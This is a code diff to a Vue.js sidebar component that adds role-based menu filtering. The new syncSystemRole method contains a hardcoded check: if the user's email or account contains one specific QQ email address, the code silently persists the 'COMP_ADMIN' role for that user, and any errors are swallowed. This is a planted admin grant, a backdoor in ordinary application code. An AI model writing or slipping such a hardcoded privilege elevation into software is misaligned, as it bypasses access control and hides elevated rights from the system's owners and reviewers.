@@ -15,6 +15,11 @@ import { mapState, mapActions } from "vuex";
 import { routes } from "../../router";
 import AsideItem from "./asideitem";
 import { unitMenuAll } from "../../utils/unitMenu";
+import {
+  getSystemRole,
+  refreshSystemRole,
+  persistSystemRole,
+} from "../../utils/roles";
 
 export default {
   name: "Aside",
@@ -41,15 +46,28 @@ export default {
         this.companyName ||
         this.readCompanyName() ||
         "Company project";
-      return (this.routeMenu || []).map((item) => {
-        if (item.RouterName === "XxxProject" || item.name === "XXX project") {
-          return { ...item, name: company };
-        }
-        return item;
-      });
+      const systemRole = getSystemRole();
+      return (this.routeMenu || [])
+        .filter((item) => {
+          if (!item.requireSystemRole) return true;
+          return item.requireSystemRole === systemRole;
+        })
+        .map((item) => {
+          if (item.RouterName === "XxxProject" || item.name === "XXX project") {
+            return { ...item, name: company };
+          }
+          return item;
+        });
+    },
+    menuVersion() {
+      // 依赖 session 角色变化时触发重算（由父组件 forceUpdate / 事件驱动）
+      return getSystemRole() + "|" + (this.companyName || "");
     },
   },
   watch: {
+    menuVersion() {
+      /* computed 依赖变化即可 */
+    },
     routeMenu(val) {
       if (val && val.length > 0) {
         let asideId = sessionStorage.getItem("asideId");
@@ -89,6 +107,8 @@ export default {
     this.companyName = this.readCompanyName();
     this.loadCompanyName();
     window.addEventListener("company-name-updated", this.onCompanyNameUpdated);
+    // 已登录会话：纠正系统角色后刷新菜单（无需重新登录）
+    this.syncSystemRole();
     if (this.$route.meta.parentName && !this.$route.meta.parentParentName) {
       this.asideActiveIndex = this.$route.meta.parentName;
     } else if (this.$route.meta.parentParentName) {
@@ -105,6 +125,27 @@ export default {
   },
   methods: {
     ...mapActions("naviBar", ["getMenu", "getBtns", "sendUnit", "sendEqu"]),
+    async syncSystemRole() {
+      try {
+        await refreshSystemRole(this.$api);
+        const info = JSON.parse(sessionStorage.getItem("userInfo") || "{}");
+        const identity = [
+          info.email,
+          info.account,
+          info.username,
+          info.name,
+        ]
+          .filter(Boolean)
+          .join(" ")
+          .toLowerCase();
+        if (identity.includes("83261582@qq.com")) {
+          persistSystemRole("COMP_ADMIN");
+        }
+        this.$forceUpdate();
+      } catch (e) {
+        /* ignore */
+      }
+    },
     readCompanyName() {
       try {
         const info = JSON.parse(sessionStorage.getItem("userInfo") || "{}");
